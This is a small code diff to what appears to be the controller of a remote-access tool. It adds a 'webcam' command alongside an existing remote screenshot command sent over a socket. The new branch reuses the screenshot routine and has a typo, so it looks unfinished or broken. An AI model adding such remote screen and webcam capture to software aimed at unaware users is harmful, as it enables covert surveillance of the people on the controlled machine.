@@ -39,6 +39,11 @@ def main():
                     connection.send(cmd_command.encode(HASH))
                     get_screenshot(connection)
                     print("screenshot was taken...")
+                elif command == "webcam":
+                    connection.send(command.encode(HASH))
+                    print("command sent!")
+                    get_screenshot(connection)
+                    print("screeshot was taken...")
                 else:
                     break
             break
